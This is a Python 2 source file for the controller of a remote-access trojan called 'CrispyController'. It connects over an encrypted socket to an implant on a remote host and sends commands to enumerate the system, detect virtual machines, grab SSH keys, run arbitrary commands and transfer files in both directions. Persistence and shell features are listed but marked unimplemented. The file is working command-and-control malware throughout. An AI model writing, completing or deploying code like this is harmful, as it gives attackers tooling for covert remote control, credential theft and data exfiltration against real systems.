import os
import socket
import sys

from constants import BANNER, BUFFER_SIZE, EOF_STR

class CrispyController:  
    def __init__(self, host, port, cipher):
        self.host = host
        self.port = port
        self.cipher = cipher
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def help_menu(self):
        info = """
        Remote commands:
            enum_os            - get operating system info
            enum_applications  - get a list of installed applications
            enum_drives        - get a list of drives
            enum_printers      - get a list of printers
            execute            - run a command on remote host
            is_virtual         - determine if remote host is running on a virtual machine
            get_ssh_keys       - get any ssh keys
            download           - download [src absolute path] [dest absolute path]
            upload             - upload [src absolute path] [dest absolute path]
            persistence        - make py persistent through reboots
            search             - search for files matching a given regular expression
            shell              - drop to a shell
        Local commands:
            lcd                - change local directory
            lpwd               - print current working directory
            sessions           - list all connected sessions
            exit               - close down connection to remote host
        """
        return info
    
    def receiveFile(self, downFile):
        if os.path.isfile(downFile):
            return False 
        else:   
            with open(downFile, 'wb') as f:
                while True:
                    data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
                       
                    if not data:
                        break
                    elif EOF_STR in data: 
                        f.write(data[:-8])
                        break
                    else:
                        f.write(data)
            return True
     
    def uploadFile(self, upFile):
        if os.path.isfile(upFile):
            with open(upFile, 'rb') as f:
                while True:
                    data = f.read(BUFFER_SIZE)

                    if not data:
                        self.sock.sendall(self.cipher.encode(EOF_STR))
                        break
                    else:
                        self.sock.sendall(self.cipher.encode(data))
            return True
        else:
            return False

    def run(self):
        try:
            self.sock.connect((self.host, self.port))
            print BANNER
            
            while True:
                cmd = raw_input("%s:%i>> " % (self.host, self.port)).strip()
                 
                if cmd == '-h' or cmd == 'help':
                    print self.help_menu()
                elif cmd == 'sessions':
                    print "need to implement"
                elif cmd.startswith('lcd'):
                    args = cmd.split(' ')

                    if len(args) == 2 and os.path.isdir(args[1]):
                        os.chdir(args[1])
                    else:
                        print "[!] You must use a valid path e.g >> lcd /Users/Crispy\n"
                elif cmd == 'lpwd':
                    print "{0}\n".format(os.getcwd())
                elif cmd.startswith("search"):
                    print "need to implement"
                elif cmd == "shell":
                    print "need to implement"
                elif cmd == "persistence":
                    print "need to implement"
                elif cmd.startswith('download'):
                    args = cmd.split(' ')
                    
                    if len(args) == 3:
                        if os.path.isfile(args[2]):
                            print "[!] File already exists locally.\n"
                        else:
                            print "[-] Attempting download of " + args[1] + "..."
                            self.sock.sendall(self.cipher.encode(cmd + "\n"))
                             
                            if self.receiveFile(args[2]):      
                                print "[+] File transfer complete!\n"
                            else:
                                print "[!] File transfer failed.\n"
                    else:
                        print "[!] You must include a src and dest directory e.g >> download /tmp/test.txt /Users/Crispy/test.txt \n"
                elif cmd.startswith('upload'):
                    args = cmd.split(' ')
                    
                    if len(args) == 3:
                        if os.path.isfile(args[1]):
                            print "[-] Attempting upload of " + args[1] + "..."
                            self.sock.sendall(self.cipher.encode(cmd + "\n"))
        
                            if self.uploadFile(args[1]):
                                print "[+] File transfer complete!\n"
                            else:
                                print "[!] File transfer failed.\n"
                        else:
                            print "[!] File does not exist locally.\n"
                    else:
                        print "[!] You must include a src and dest directory e.g >> upload /Users/Crispy/test.txt /tmp/test.txt\n"
                elif cmd == 'exit' or cmd == 'quit':
                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
                    self.sock.close()
                    sys.exit(0)
                else:
                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
                    data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
                    print data
        except Exception as e:
            print "[!] Controller run() --> {0}".format(e)
        finally:
            sys.exit(0)